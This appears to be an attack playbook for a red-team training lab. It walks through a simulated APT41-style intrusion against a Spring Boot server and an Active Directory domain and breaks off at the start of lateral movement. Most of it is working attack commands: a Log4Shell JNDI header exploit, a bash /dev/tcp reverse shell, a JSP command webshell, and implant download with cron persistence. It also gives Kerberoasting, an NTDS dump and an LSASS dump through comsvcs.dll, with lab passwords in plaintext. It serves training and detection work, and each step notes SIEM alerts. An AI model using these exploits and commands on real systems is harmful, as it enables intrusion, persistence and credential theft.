# Attack Playbook — Operation DragonRx
## Phase-by-Phase Attack Guide: Exact Commands Against the Deployed Lab

**Operator perspective:** All commands run from the Kali Docker container unless otherwise noted.
**Lab shell notation:**
- `[KALI]` — Kali attacker container (`make shell` or `docker exec -it dragonrx_kali /bin/bash`)
- `[WEB01]` — shell on Ubuntu web server (192.168.10.100), obtained in Phase 1
- `[WS01]` — Windows 10 psexec session (192.168.10.50)
- `[DC01]` — Windows Server 2019 Domain Controller (192.168.10.10)
- `[C2]` — Sliver console (`docker exec -it dragonrx_c2 sliver`)

---

> **Operation DragonRx series** · [CTI Report](apt41-dragonrx-cti-report.md) · [Lab Architecture](lab-architecture.md) · **Attack Playbook** · [Detection Guide](detection-guide.md) · [DFIR Playbook](dfir-playbook.md) · [Malware Analysis](rxphage-malware.md)

## Table of Contents

- [Lab Start Checklist](#lab-start-checklist)
- [Network Reference Card](#network-reference-card)
- [Phase 0: Reconnaissance](#phase-0-reconnaissance)
- [Phase 1: Initial Access — Log4Shell](#phase-1-initial-access--log4shell-cve-2021-44228)
- [Phase 2: Foothold — Webshell + Implant](#phase-2-foothold--webshell--implant)
- [Phase 3: Discovery](#phase-3-discovery)
- [Phase 4: Credential Access](#phase-4-credential-access)
- [Phase 5: Lateral Movement](#phase-5-lateral-movement)
- [Phase 6: Collection](#phase-6-collection)
- [Phase 7: Exfiltration](#phase-7-exfiltration)
- [Phase 8: DLL Sideloading Persistence on DC01](#phase-8-dll-sideloading-persistence-on-dc01)
- [Phase 9: Ransomware (Optional)](#phase-9-optional-ransomware-phase)
- [Phase 10: Cleanup](#phase-10-cleanup--anti-forensics)
- [Kill Chain Summary](#kill-chain-summary)

---

## Lab Start Checklist

Run these before touching any attack commands.

```bash
# 1. Deploy the lab (from dragonrx-lab/ directory)
make up
# First run: ~45 min (Vagrant boxes download, Ansible provisions)
# Subsequent runs (boxes cached): ~10 min

# 2. Verify all services are healthy
make test
# Expected: all green — DC01, FS01, WS01, Wazuh, Elastic, Zeek, JNDI

# 3. Open Kali attacker shell (keep this open throughout)
make shell
# Equivalent: docker exec -it dragonrx_kali /bin/bash

# 4. Optional: watch SIEM alerts in parallel
# Open http://localhost:5601 in a browser (Kibana)
# Navigate to: Security → Alerts
```

---

## Network Reference Card

```
ATTACKER NETWORK  10.0.0.0/24  (Docker bridge: attacker_net)
  10.0.0.5    dragonrx_kali   Your operator shell, staging HTTP server, reverse shell listener
  10.0.0.10   dragonrx_c2     Sliver C2 — HTTPS implant listener on :443 (internal)
  10.0.0.20   dragonrx_jndi   marshalsec LDAP relay :1389 + Exploit.class HTTP server :8080

TARGET NETWORK  192.168.10.0/24  (Docker bridge: target_net + VirtualBox bridged NICs)
  10.0.0.100 / 192.168.10.100  dragonrx_web01  Spring Boot + log4j-core 2.14.1  :8080
  192.168.10.10                DC01            Windows Server 2019 — novatech.local DC
  192.168.10.20                FS01            Windows Server 2019 — SMB file server
  192.168.10.50                WS01            Windows 10 22H2 — jsmith workstation
  192.168.10.200               dragonrx_wazuh  Wazuh manager
  192.168.10.203               dragonrx_kibana Kibana SIEM — http://localhost:5601

ROUTING: setup_routing.sh enables IP forwarding + iptables FORWARD between attacker_net and target_net.
Kali at 10.0.0.5 can reach all hosts in 192.168.10.0/24 via this routing.

WEB01 is dual-homed — reachable from Kali as 10.0.0.100:8080 AND from Windows VMs as 192.168.10.100:8080.
```

**Credentials provisioned by Ansible (do NOT use these directly — discover them in-sim):**
```
Domain:        novatech.local  /  NOVATECH (NetBIOS)
Administrator: NovaTech_Admin2024!    (Domain Admin on DC01)
jsmith:        Research#2024          (R&D dept — local admin on WS01)
svc_ldap:      NovaTech2021!          (service account — leaked in WEB01 config)
svc_backup:    Backup_Svc99!          (Kerberoastable — SPN set, Backup Operators member)
```

---

## Phase 0: Reconnaissance

**ATT&CK:** T1595.002, T1592.002, T1596.003, T1596.005, T1589.002

**What's happening:** Before touching the target, the attacker maps the external attack surface using
passive and active techniques that generate minimal or no alerts. The goal is to confirm the
Log4Shell-vulnerable Java application without triggering any SIEM rules.

### 0.1 Passive Recon (simulated — no real external footprint in lab)

> In the scenario, NovaTech Pharma has a patient portal at `portal.novatech-pharma.com`.
> Against a real target these would return real data. In the lab, skip to §0.2.

```bash
[KALI]
# Certificate transparency logs (crt.sh) — enumerate subdomains without touching target
# crt.sh is a public database of TLS certificates — read-only external query, zero alert on target
curl -s "https://crt.sh/?q=%25.novatech-pharma.com&output=json" | \
  python3 -c "
import sys, json
data = json.load(sys.stdin)
names = set(r['name_value'] for r in data)
[print(n) for n in sorted(names)]
" 2>/dev/null
# Expected: portal.novatech-pharma.com, api.novatech-pharma.com, mail.novatech-pharma.com ...

# Shodan — search internet-wide scan database for NovaTech assets
# Query runs against Shodan's index, never contacts the target
shodan search 'org:"NovaTech Pharma"' --fields ip_str,port,product,version 2>/dev/null
shodan search 'ssl.cert.subject.CN:"novatech-pharma.com"' 2>/dev/null

# Employee harvesting — LinkedIn/Google/Bing for email addresses and employee names
# Gives us potential usernames for password spray or phishing later
theHarvester -d novatech-pharma.com -b google,linkedin,bing -l 200 2>/dev/null
```

**Why it matters:** Passive recon confirms the target is running Java infrastructure and has internet-
exposed services. All of this creates zero alerts on the target — it never sees any of these requests.

### 0.2 Active Web Fingerprinting

```bash
[KALI]
# Create output directory
mkdir -p /opt/loot/recon

# Full version scan on the web application
# -sV: version detection   -sC: default scripts   -p 8080: port we care about
# -oA: write all output formats (nmap, gnmap, xml) to file
nmap -sV -sC -p 8080 10.0.0.100 -oA /opt/loot/recon/web01_scan
```

**Expected output:**
```
PORT     STATE SERVICE VERSION
8080/tcp open  http    Apache Tomcat/Coyote JSP engine 1.1
| http-title: Patient Portal - NovaTech Pharma
|_http-server-header: Apache-Coyote/1.1
```

```bash
[KALI]
# Web technology fingerprinting — detects frameworks, CMS, server headers
whatweb http://10.0.0.100:8080 -v 2>/dev/null | tee /opt/loot/recon/whatweb.txt

# Read raw response headers — look for Server, X-Powered-By
curl -s -o /dev/null -D - http://10.0.0.100:8080/ | grep -iE "server|x-powered|content-type"
```

**Expected:**
```
Server: Apache-Coyote/1.1
Content-Type: text/html;charset=UTF-8
```

```bash
[KALI]
# CRITICAL STEP: trigger a 404 error to expose the Java stack trace
# This app has debug error pages enabled (dev config left in production)
curl -s "http://10.0.0.100:8080/DOESNOTEXIST" 2>/dev/null | grep -i "log4j\|core\|jar\|java"
```

**Expected — this is the Log4Shell confirmation:**
```
...log4j-core-2.14.1.jar...
...org.apache.logging.log4j...
...at com.novatech.portal...
```

The stack trace exposes `log4j-core-2.14.1.jar` in the classpath. CVE-2021-44228 affects Log4j 2
versions 2.0-beta9 through 2.15.0 — this version (2.14.1) is vulnerable. Confirmed without sending
any exploit code.

**SIEM detection posture:** Zero alerts. These are all standard HTTP requests or external database
queries. Zeek logs the 404 but generates no alert.

---

## Phase 1: Initial Access — Log4Shell (CVE-2021-44228)

**ATT&CK:** T1190

**What's happening:** Log4j 2 processes a JNDI lookup string (`${jndi:ldap://...}`) embedded in any
logged value — in this case the `X-Api-Version` HTTP header. When Log4j sees this string, it initiates
an outbound LDAP connection to the attacker-controlled relay (marshalsec). The relay redirects the
victim JVM to download a Java class from the attacker's HTTP server. Since this JVM runs Java 8
pre-u191 (`com.sun.jndi.ldap.object.trustURLCodebase=true`), it instantiates the downloaded class,
executing its static initializer — which runs our reverse shell command.

The `dragonrx_jndi` container handles the entire relay chain automatically:
- marshalsec LDAP relay: `10.0.0.20:1389`
- Exploit.class HTTP server: `10.0.0.20:8080` (host port `8888`)
- `Exploit.class` payload: `bash -i >& /dev/tcp/10.0.0.5/4444 0>&1`

**You do not compile anything.** Just open a listener and fire one curl.

### 1.1 Verify the JNDI Relay is Ready

```bash
[KALI]
# Check JNDI server container is running and listening
docker logs dragonrx_jndi 2>&1 | tail -8
```

**Expected:**
```
[*] Starting payload HTTP server on :8080...
[*] Starting marshalsec LDAP relay on :1389...
Listening on 0.0.0.0:1389
```

```bash
[KALI]
# Optional: verify WEB01 can reach the JNDI relay (dry run with no payload)
# This sends a JNDI lookup that will fail (no class named 'test') — but confirms callback
curl -s http://10.0.0.100:8080/ \
  -H 'X-Api-Version: ${jndi:ldap://10.0.0.20:1389/test}'

# Check if JNDI server received the callback
docker logs dragonrx_jndi 2>&1 | tail -5
# Expected: "Received connection from 192.168.10.100" or similar
```

### 1.2 Get the Reverse Shell

```bash
[KALI] — Terminal 1: open reverse shell listener FIRST
# rlwrap adds readline support (arrow keys, history) to the raw nc shell
rlwrap nc -lvnp 4444
# Listening on 0.0.0.0 4444
```

```bash
[KALI] — Terminal 2: fire the exploit
# The ${jndi:ldap://} string is what Log4j processes
# 10.0.0.20:1389  — marshalsec LDAP relay
# /Exploit        — path that marshalsec redirects to http://10.0.0.20:8080/Exploit.class
curl -s http://10.0.0.100:8080/ \
  -H 'X-Api-Version: ${jndi:ldap://10.0.0.20:1389/Exploit}'
# No output expected — the curl just sends the header and returns
```

**Back in Terminal 1 — shell appears within 2-3 seconds:**
```
Connection received on 192.168.10.100 XXXXX
bash: no job control in this shell
www-data@web01:/opt/spring-boot$
```

**Verify your position:**
```bash
[WEB01]
id
# uid=33(www-data) gid=33(www-data) groups=33(www-data)
whoami
# www-data
hostname
# web01
```

**Forensic artifact created (irreversible):** Tomcat access log writes the raw `${jndi:}` string:
```
10.0.0.5 - - [20/Apr/2026:14:23:07 +0000] "GET / HTTP/1.1" 200 - "X-Api-Version: ${jndi:ldap://10.0.0.20:1389/Exploit}"
```
This log entry survives even if you delete bash history, kill the implant, or overwrite the shell.

**SIEM alerts fired:**
- Zeek HTTP: `Log4Shell JNDI string in X-Api-Version header` — **CRITICAL**
- Sysmon EID 1: `java spawned bash` — **CRITICAL**

**If the shell doesn't land:**
```bash
# Check the JNDI container caught the request
docker logs dragonrx_jndi 2>&1 | tail -10

# Check the Exploit.class is being served correctly from within the lab
curl -s http://10.0.0.20:8080/Exploit.class | file -
# Should return: Java class data

# Confirm WEB01 JVM version (must be Java 8 pre-u191 for remote classloading)
docker exec dragonrx_web01 java -version 2>&1
# Expected: openjdk version "1.8.0_xxx" — where xxx < 191
```

---

## Phase 2: Foothold — Webshell + Implant

**ATT&CK:** T1505.003, T1053.003, T1059.004

**What's happening:** The reverse shell is fragile — a single network hiccup kills it with no way back.
APT41 is documented to establish multiple redundant persistence mechanisms before lateral movement.
We deploy two independent channels: a JSP webshell (instantly accessible via HTTP) and the RxPhage
beacon (persistent C2 via Sliver HTTPS). Both survive the reverse shell dying.

### 2.1 Stabilize the Reverse Shell (PTY Upgrade)

The raw reverse shell has no TTY: no tab completion, commands like `sudo` break, Ctrl+C kills the
whole shell. Upgrade to a proper PTY:

```bash
[WEB01 — raw reverse shell]
# Spawn a Python PTY — creates a proper terminal session
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Now you have a bash prompt but it's still half-raw

# Press Ctrl+Z to background the shell (it stays running in Kali's nc)
```

```bash
[KALI]
# Set raw mode on Kali terminal — passes all keystrokes including Ctrl+C to the shell
stty raw -echo
# Then bring the shell back to foreground
fg
# Press Enter once
```

```bash
[WEB01 — now a proper PTY]
# Set terminal dimensions so vim/less work correctly
export TERM=xterm
stty rows 50 cols 200
```

### 2.2 Deploy JSP Webshell (China Chopper Pattern)

**Why this path:** `/resources/imgs/` looks like a static image directory. A `.jsp` file there is
plausible enough to avoid immediate scrutiny. The China Chopper pattern (one-liner parameter-based
shell) is one of APT41's most extensively documented webshell families.

```bash
[WEB01]
# Find where Tomcat serves files from
# The vulnerable app uses Spring Boot with embedded Tomcat — check for webapps directory
find / -name "webapps" -type d 2>/dev/null | grep -v proc
# Common paths: /opt/tomcat/webapps/ROOT  or  the Spring Boot app serves from classpath

# For the ghcr.io/christophetd/log4shell-vulnerable-app image:
find / -name "*.jar" -path "*/spring*" 2>/dev/null | head -3
# The app runs from /app/spring-webmvc-demo.jar — static content is in the jar, not the filesystem

# Check if there's a static directory we can write to
find / -name "static" -type d 2>/dev/null | grep -v proc
# Or: write to /tmp and exploit the webshell via another path

# Option A: If a writable webroot exists
ls -la /var/lib/tomcat*/webapps/ROOT/ 2>/dev/null || ls -la /opt/tomcat/webapps/ROOT/ 2>/dev/null

# Option B: Write to /tmp and access via reverse shell / implant
# (Spring Boot embedded apps don't expose /tmp via HTTP, so use Option A if available)
```

```bash
[WEB01]
# Write JSP webshell to discovered webroot
# Adjust path based on what find returned above
WEBROOT="/opt/tomcat/webapps/ROOT"    # adjust if different
mkdir -p ${WEBROOT}/resources/imgs

cat > ${WEBROOT}/resources/imgs/cache.jsp << 'JSPEOF'
<%@page import="java.util.*,java.io.*"%><%
String cmd = request.getParameter("c");
if(cmd != null && !cmd.isEmpty()) {
    Process p = Runtime.getRuntime().exec(new String[]{"/bin/bash","-c",cmd});
    BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));
    StringBuilder sb = new StringBuilder();
    String line;
    while((line = br.readLine()) != null) sb.append(line).append("\n");
    out.print(sb.toString());
}
%>
JSPEOF

# Verify file was written
ls -la ${WEBROOT}/resources/imgs/cache.jsp
```

**Test the webshell from Kali:**
```bash
[KALI]
# Test via GET parameter — URL-encode spaces as %20 or use --data-urlencode
curl -s "http://10.0.0.100:8080/resources/imgs/cache.jsp?c=id%3Bwhoami%3Bhostname"
```

**Expected:**
```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data
web01
```

> **Note:** If the Spring Boot app doesn't have a writable webroot, execute commands via the existing
> reverse shell or RxPhage implant instead. The webshell is a convenience — not required to proceed.

**SIEM alert fired:**
- Sysmon EID 11 (FileCreate): `.jsp` file created in Tomcat webroot — **HIGH**

### 2.3 Deploy RxPhage Implant

**Why RxPhage:** A reverse shell dies if the connection drops. The RxPhage Go beacon connects OUT to
the Sliver C2 on a schedule — if the connection drops, it just reconnects on the next interval.
Cron `@reboot` means it restarts even if the container restarts.

> **Pre-built binary:** `/opt/tools/rxphage/rxphage` is volume-mounted from the host into Kali at
> `/opt/tools/rxphage/rxphage`. See [rxphage-malware.md](rxphage-malware.md) if you need to build it.

```bash
[KALI] — Terminal 2: serve tools directory on port 8900
ls -lh /opt/tools/rxphage/rxphage    # confirm binary exists
file /opt/tools/rxphage/rxphage      # should be: ELF 64-bit LSB executable, x86-64

python3 -m http.server 8900 --directory /opt/tools/ &
# Serving HTTP on 0.0.0.0 port 8900 ...
```

```bash
[WEB01 — via reverse shell or webshell]
# Download from Kali's staging server (10.0.0.5 is reachable from web01)
mkdir -p /tmp/.cache
wget -q http://10.0.0.5:8900/rxphage/rxphage -O /tmp/.cache/rxphage
chmod +x /tmp/.cache/rxphage

# Verify download succeeded
ls -lh /tmp/.cache/rxphage
file /tmp/.cache/rxphage
# ELF 64-bit LSB executable, x86-64, statically linked

# Install cron persistence for www-data
# @reboot runs once at startup — survives container/VM restarts
(crontab -l 2>/dev/null; echo '@reboot /tmp/.cache/rxphage') | crontab -

# Verify cron was written
crontab -l
# @reboot /tmp/.cache/rxphage

# Start the implant NOW without waiting for a reboot
nohup /tmp/.cache/rxphage &>/dev/null &
echo "RxPhage PID: $!"
```

**Switch to Sliver C2 and wait for the beacon:**
```bash
[C2] — new terminal
docker exec -it dragonrx_c2 sliver

sliver > sessions
```

**Expected — beacon appears within 60 seconds (default check-in interval):**
```
ID  Name   Transport  RemoteAddress            Hostname  Username  OS/Arch         Last Message
1   WEB01  https      192.168.10.100:43221     web01     www-data  linux/amd64     3s ago
```

```bash
sliver > use 1          # or: use WEB01
sliver (WEB01) > whoami
# www-data

sliver (WEB01) > ifconfig
# eth0   10.0.0.100/24
# eth1   192.168.10.100/24
# lo     127.0.0.1/8

sliver (WEB01) > getpid
# 1847
```

You now have persistent, encrypted HTTPS C2 to WEB01. Close the raw reverse shell — you don't need
it anymore. The Sliver session survives as long as the container runs, and restores after reboot via
cron.

---

## Phase 3: Discovery

**ATT&CK:** T1046, T1082, T1087.002, T1069.002, T1018, T1552.001

**What's happening:** Systematic internal recon. The attacker has code execution on a web server with
two network interfaces — a pivot point between the attacker network and the corporate target network.
The goal is to map the AD environment and find credentials to move laterally.

### 3.1 Host Information and Network Position

```bash
[WEB01 — via Sliver shell or webshell]
# Basic system information
id; whoami; hostname; uname -a; cat /etc/os-release | head -5

# Network interfaces — confirm dual-homed position
ip addr show
# eth0: 10.0.0.100/24       (attacker network — can reach Kali, C2, JNDI)
# eth1: 192.168.10.100/24   (target network — can reach DC01, FS01, WS01)

# Routing table — confirm routes to both networks
ip route show

# /etc/hosts — pre-configured hostnames?
cat /etc/hosts

# What's this process talking to already?
ss -antup | grep -v "127.0.0.1"
```

### 3.2 Internal Network Sweep

**Why:** We know the target /24 (192.168.10.0/24) from the routing table. We need to find all live
hosts and identify what services they expose before deciding where to move.

```bash
[WEB01]
# Ping sweep — runs all pings in parallel (& at end of each), waits for all to finish
for i in $(seq 1 254); do
  (ping -c 1 -W 1 192.168.10.$i &>/dev/null && echo "192.168.10.$i UP") &
done; wait
```

**Expected — live hosts found:**
```
192.168.10.5   UP   (dragonrx_kali — our own Kali container on target_net)
192.168.10.10  UP   (DC01)
192.168.10.20  UP   (FS01)
192.168.10.50  UP   (WS01)
192.168.10.100 UP   (WEB01 — ourselves)
192.168.10.200 UP   (Wazuh SIEM)
```

```bash
[WEB01]
# Service scan against discovered Windows hosts
# -sV: detect service versions   -p: only scan relevant ports
nmap -sV -p 135,139,389,445,636,3389,5985,5986 \
  192.168.10.10 192.168.10.20 192.168.10.50 2>/dev/null
```

**Expected results:**
```
192.168.10.10 (DC01):
  389/tcp  open  ldap        Microsoft Windows Active Directory LDAP
  445/tcp  open  microsoft-ds Windows Server 2019
  3389/tcp open  ms-wbt-server RDP

192.168.10.20 (FS01):
  445/tcp  open  microsoft-ds Windows Server 2019

192.168.10.50 (WS01):
  445/tcp  open  microsoft-ds Windows 10
  3389/tcp open  ms-wbt-server RDP
  5985/tcp open  http         WinRM
```

**Assessment:**
- `192.168.10.10` — LDAP + RDP = Domain Controller
- `192.168.10.20` — SMB only = file server (the crown jewel location)
- `192.168.10.50` — SMB + RDP + WinRM = domain-joined workstation

**SIEM alert fired:**
- Zeek conn.log: port scan pattern from `192.168.10.100` — **MEDIUM**

### 3.3 Credential Discovery in WEB01 Config

**Why this works:** The `dragonrx_web01` container connects to Active Directory LDAP for user
authentication. Docker Compose passes those credentials via environment variables. In Linux, every
process's environment variables are readable at `/proc/PID/environ` — including by the process itself
(and by root, or by the www-data user reading its own process).

```bash
[WEB01]
# Read this process's own environment — null-delimited, tr converts to newlines
cat /proc/1/environ | tr '\0' '\n' | sort
```

**Expected — credentials in plain text:**
```
DOMAIN_CONTROLLER=192.168.10.10
LDAP_PASS=NovaTech2021!
LDAP_USER=svc_ldap
HOSTNAME=web01
HOME=/root
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
...
```

```bash
[WEB01]
# Also check Spring Boot application properties (may have the same creds)
find / -name "application*.yml" -o -name "application*.properties" 2>/dev/null | \
  grep -v proc | xargs grep -il "password\|ldap\|username" 2>/dev/null

# Check Tomcat context.xml if present
find / -name "context.xml" 2>/dev/null | grep -v proc | \
  xargs grep -i "password\|connectionPassword" 2>/dev/null
```

**CRITICAL FIND:** `svc_ldap / NovaTech2021!` — valid Active Directory service account.
This single credential opens the entire AD directory for enumeration from this Linux container.

### 3.4 Active Directory Enumeration from Linux

**Why ldapsearch:** We have valid AD credentials and port 389 (LDAP) is open on DC01. We don't need
any Windows tools — `ldapsearch` speaks the LDAP protocol natively from Linux. This enumerates
every user, group, and service principal in the domain.

```bash
[KALI — or WEB01: run wherever you prefer]
# Enumerate all domain user accounts
# -x: simple auth   -H: LDAP URI   -D: bind DN   -w: password
# -b: search base   "(objectClass=user)": filter for user objects
ldapsearch -x \
  -H ldap://192.168.10.10 \
  -D "cn=svc_ldap,dc=novatech,dc=local" \
  -w "NovaTech2021!" \
  -b "dc=novatech,dc=local" \
  "(objectClass=user)" \
  sAMAccountName description department userAccountControl \
  2>/dev/null | grep -E "^sAMAccountName|^description|^department"
```

**Expected:**
```
sAMAccountName: Administrator
sAMAccountName: Guest
sAMAccountName: krbtgt
sAMAccountName: jsmith
description: R&D researcher
department: R&D
sAMAccountName: svc_ldap
description: LDAP service account — creds leaked in context.xml
sAMAccountName: svc_backup
description: Kerberoastable backup service account
```

```bash
[KALI]
# Find Domain Admins group members
ldapsearch -x \
  -H ldap://192.168.10.10 \
  -D "cn=svc_ldap,dc=novatech,dc=local" \
  -w "NovaTech2021!" \
  -b "cn=Domain Admins,cn=Users,dc=novatech,dc=local" \
  "(objectClass=group)" member \
  2>/dev/null
```

**Expected:** `member: CN=Administrator,CN=Users,DC=novatech,DC=local`

```bash
[KALI]
# CRITICAL: find Kerberoastable accounts — users with SPNs registered
# SPN (Service Principal Name) presence means a valid TGS ticket can be requested
# and cracked offline — no DC interaction needed after the initial request
ldapsearch -x \
  -H ldap://192.168.10.10 \
  -D "cn=svc_ldap,dc=novatech,dc=local" \
  -w "NovaTech2021!" \
  -b "dc=novatech,dc=local" \
  "(&(objectClass=user)(servicePrincipalName=*))" \
  sAMAccountName servicePrincipalName memberOf \
  2>/dev/null | grep -E "^sAMAccountName|^servicePrincipalName|^memberOf"
```

**Expected:**
```
sAMAccountName: svc_backup
servicePrincipalName: MSSQLSvc/fs01.novatech.local:1433
memberOf: CN=Backup Operators,CN=Builtin,DC=novatech,DC=local
```

**Intelligence gained:**
- `svc_backup` has SPN → Kerberoastable (can request TGS, crack hash offline)
- `svc_backup` is in **Backup Operators** — a powerful Windows built-in group with SeBackupPrivilege
- `jsmith` is R&D → likely has access to the research data on FS01
- `jsmith` is confirmed local admin on WS01 (from Ansible provisioning)

---

## Phase 4: Credential Access

**ATT&CK:** T1552.001, T1558.003, T1003.001, T1003.003

### 4.1 Kerberoasting — svc_backup

**What is Kerberoasting:** When an account has a registered SPN, any authenticated domain user can
request a Kerberos TGS (Ticket Granting Service) ticket for it from the KDC. The KDC encrypts that
ticket with the target account's NTLM hash. The encrypted ticket is returned to the requestor — who
can then crack it offline with no further DC interaction. The cracking is entirely off-network.

```bash
[KALI]
mkdir -p /opt/loot

# Request TGS for every SPN-registered account using svc_ldap credentials
# -dc-ip: target Domain Controller
# -request: actually fetch the TGS tickets (not just list them)
# -outputfile: save hashes to file for hashcat
impacket-GetUserSPNs \
  novatech.local/svc_ldap:'NovaTech2021!' \
  -dc-ip 192.168.10.10 \
  -request \
  -outputfile /opt/loot/kerberoast_hashes.txt
```

**Expected:**
```
ServicePrincipalName                  Name        MemberShip           PasswordLastSet  LastLogon
------------------------------------  ----------  -------------------  ---------------  ---------
MSSQLSvc/fs01.novatech.local:1433     svc_backup  Backup Operators     2026-04-20       <never>

[-] CCache file is not found. Skipping...
$krb5tgs$23$*svc_backup$NOVATECH.LOCAL$novatech.local/svc_backup*$1a2b3c...
[hash written to /opt/loot/kerberoast_hashes.txt]
```

```bash
[KALI]
cat /opt/loot/kerberoast_hashes.txt
# $krb5tgs$23$*svc_backup$NOVATECH.LOCAL$MSSQLSvc/fs01.novatech.local:1433*$...
```

**What `$krb5tgs$23$` means:** Hash type 23 = RC4-HMAC encryption. The DC used RC4 because
svc_backup doesn't have the `msDS-SupportedEncryptionTypes` attribute set to require AES only.
RC4 hashes crack much faster than AES-256 (mode 13100 vs 19700 in hashcat).

**Detection signal:** Windows EID 4769 — Kerberos TGS request with `TicketEncryptionType: 0x17`
(RC4). Pre-configured in this lab's Wazuh rules.

```bash
[KALI]
# Crack the hash offline — no further network interaction with the DC
# -m 13100: Kerberos TGS-REP etype 23 (RC4)
# /usr/share/wordlists/rockyou.txt: ~14 million common passwords
# --rules-file best64.rule: apply common transformations (appending numbers, l33tspeak, etc.)
# -o: write cracked result to file
hashcat -m 13100 \
  /opt/loot/kerberoast_hashes.txt \
  /usr/share/wordlists/rockyou.txt \
  --rules-file /usr/share/hashcat/rules/best64.rule \
  -o /opt/loot/kerberoast_cracked.txt \
  --force

# Show result
cat /opt/loot/kerberoast_cracked.txt
```

**Expected:**
```
$krb5tgs$23$*svc_backup...<full hash>...:Backup_Svc99!
```

**Result: `svc_backup / Backup_Svc99!`**

### 4.2 Backup Operators → NTDS Dump (Domain Compromise via svc_backup)

**What is Backup Operators privilege escalation:** Windows Backup Operators hold `SeBackupPrivilege` —
the right to bypass file ACLs for backup purposes. This includes reading any file on the system,
including `NTDS.dit` (the Active Directory database containing all password hashes). impacket's
`secretsdump` can leverage this privilege remotely: it instructs the DC to create a VSS shadow copy
and reads NTDS.dit from the shadow. No Domain Admin required — Backup Operators membership is enough.

ATT&CK: T1003.003 — OS Credential Dumping: NTDS

```bash
[KALI]
# Confirm svc_backup can authenticate to DC01 (domain auth, not local)
# -u: username   -p: password   --shares: list accessible SMB shares
crackmapexec smb 192.168.10.10 \
  -u svc_backup \
  -p 'Backup_Svc99!'
```

**Expected:**
```
SMB  192.168.10.10  445  DC01  [*] Windows Server 2019 Build 17763 (name:DC01) (domain:novatech.local) (signing:True) (SMBv1:False)
SMB  192.168.10.10  445  DC01  [+] novatech.local\svc_backup:Backup_Svc99!
```

```bash
[KALI]
# Dump all domain hashes via VSS/Backup Operators path
# -use-vss: use Volume Shadow Copy Service to access NTDS.dit (bypasses locks)
# -just-dc-ntlm: only output NT hashes (skip Kerberos keys — faster, cleaner)
# -output: base filename for output files
impacket-secretsdump \
  novatech.local/svc_backup:'Backup_Svc99!'@192.168.10.10 \
  -use-vss \
  -just-dc-ntlm \
  -output /opt/loot/ntds_dump
```

**Expected output:**
```
[*] Service RemoteRegistry is in stopped state
[*] Starting service RemoteRegistry
[*] Creating a VSS snapshot on [DC01]
[*] Extracting ntds.dit from VSS snapshot
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
novatech.local\Administrator:500:aad3b435b51404eeaad3b435b51404ee:<ADMIN_NTLM>:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:<KRBTGT_NTLM>:::
novatech.local\jsmith:1103:aad3b435b51404eeaad3b435b51404ee:<JSMITH_NTLM>:::
novatech.local\svc_ldap:1104:aad3b435b51404eeaad3b435b51404ee:<SVCLDAP_NTLM>:::
novatech.local\svc_backup:1105:aad3b435b51404eeaad3b435b51404ee:<SVCBACKUP_NTLM>:::
[*] Stopping service RemoteRegistry
```

```bash
[KALI]
# Save the Administrator NTLM for Pass-the-Hash in Phase 5
cat /opt/loot/ntds_dump.ntds | grep "Administrator:"
# Extract the NT hash (field 4 of colon-delimited output)
ADMIN_NTLM=$(grep "^Administrator:" /opt/loot/ntds_dump.ntds | cut -d: -f4)
echo "Administrator NTLM: ${ADMIN_NTLM}"

# Save for later phases
echo "${ADMIN_NTLM}" > /opt/loot/admin_ntlm.txt
```

**What we have now:** Every domain account's NT hash. With the `krbtgt` hash we can forge Golden
Tickets valid for any service in the domain — persistent access that survives password resets for
all other accounts (only invalidated by double-rotating krbtgt).

**SIEM alert fired:**
- Windows EID 7036: RemoteRegistry service started — **MEDIUM**
- VSS creation events on DC01 — **HIGH**

### 4.3 LSASS Dump on WS01 (Credential Demonstration)

**Why this step:** Even though we already have domain hashes via NTDS dump, LSASS dumping is a
separate documented APT41 technique worth demonstrating. LSASS holds credentials for interactive
and service logons on the current machine — useful for extracting Kerberos tickets and any plaintext
credentials if WDigest is re-enabled. Run this after Phase 5.1 (you need a shell on WS01 first).

> Run this after you have a SYSTEM shell on WS01 from Phase 5.1.

```bash
[WS01 — cmd.exe SYSTEM session via psexec]
# C:\Temp is pre-created by Ansible provisioning
dir C:\Temp\

# Get the LSASS process ID using tasklist (cmd.exe syntax — no PowerShell needed)
for /f "tokens=2" %i in ('tasklist /fi "imagename eq lsass.exe" /fo list ^| find "PID"') do set LPID=%i
echo LSASS PID: %LPID%

# Dump LSASS using comsvcs.dll MiniDump
# rundll32.exe — signed Microsoft binary (LOLBAS: Living Off the Land Binary)
# C:\Windows\System32\comsvcs.dll — system DLL that exports MiniDump function
# MiniDump: function name   %LPID%: target process   full: include all memory regions
rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump %LPID% C:\Temp\lsass.dmp full

# Confirm dump created (should be 30-80 MB)
dir C:\Temp\lsass.dmp
```

**Expected:**
```
 Volume in drive C has no label.
 Volume Serial Number is XXXX-YYYY

 Directory of C:\Temp

04/24/2026  02:15 AM        42,394,624 lsass.dmp
```

```bash
[C2 — Sliver console]
# Download the dump to Kali for offline analysis
sliver > use <ws01-session-id>
sliver (WS01) > download C:\Temp\lsass.dmp /opt/loot/lsass.dmp
# [*] Downloading C:\Temp\lsass.dmp ... complete
```

```bash
[KALI]
# Parse with pypykatz — pure-Python Mimikatz-compatible LSASS parser
# lsa: Local Security Authority   minidump: parse from memory dump file
pypykatz lsa minidump /opt/loot/lsass.dmp 2>/dev/null | grep -A 6 "== MSV =="
```

**Expected:**
```
== MSV ==
Username: jsmith
Domain: NOVATECH
LM: None
NT: <jsmith_ntlm>   ← NTLM hash for jsmith
SHA1: <sha1>
```

> **Note:** WDigest credential caching is disabled by default on Windows 10 / Server 2016+.
> Expect NTLM hashes only — no cleartext passwords unless WDigest was explicitly re-enabled.
> `HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest\UseLogonCredential = 1` enables it.

**SIEM alert fired:**
- Sysmon EID 10 (ProcessAccess): `rundll32.exe → lsass.exe` — **CRITICAL**

---

## Phase 5: Lateral Movement

**ATT&CK:** T1021.002, T1047, T1550.002

### 5.1 WEB01 → WS01 via jsmith

